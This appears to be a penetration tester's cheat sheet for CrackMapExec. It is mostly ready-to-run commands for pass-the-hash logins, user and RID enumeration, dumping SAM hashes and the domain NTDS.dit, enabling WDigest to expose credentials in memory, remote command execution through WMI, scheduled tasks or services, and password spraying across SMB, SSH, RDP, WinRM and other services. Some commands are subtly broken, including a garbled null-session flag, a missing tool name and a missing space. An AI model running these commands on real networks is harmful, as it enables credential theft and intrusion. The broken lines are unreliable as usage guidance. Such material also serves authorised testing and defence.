

# CrackMapExec


### SMB
```
# Connect to target using local account
crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'PASSWORD' --local-auth


# Null session
crackmapexec smb 10.10.10.10 -u "" up ""


# Pass the hash against a subnet
crackmapexec smb 10.10.10.10 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 10.10.10.10 -u administrator -H 'NTHASH'


# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

# Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable




# Dump the NTDS.dit from DC using methods from secretsdump.py
# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant 
# linked-lists into readable format
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history



```

### Execution & Co
```
# CrackMapExec has 3 different command execution methods (in default order) :
wmiexec --> WMI
atexec --> scheduled task
smbexec --> creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'

```

### Bruteforcing and Password Spraying
```
crackmapexec smb 10.10.10.10 -u user_file.txt -p pass_file.txt 
crackmapexec ssh 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec ftp 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec ldap 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec rdp 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec winrm 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec mssql 10.10.10.10 -u user_file.txt -p pass_file.txt


#Options for range/files
crackmapexec xxx 10.10.10.10 -u "admin" -p "password1"
crackmapexec xxx 10.10.10.10-u "admin" -p "password1" "password2"
crackmapexec xxx 10.10.10.10 -u "admin1" "admin2" -p "P@ssword"
crackmapexec xxx 10.10.10.10 -u user_file.txt -p pass_file.txt
crackmapexec xxx 10.10.10.10 -u user_file.txt -H ntlm_hashFile.txt
```
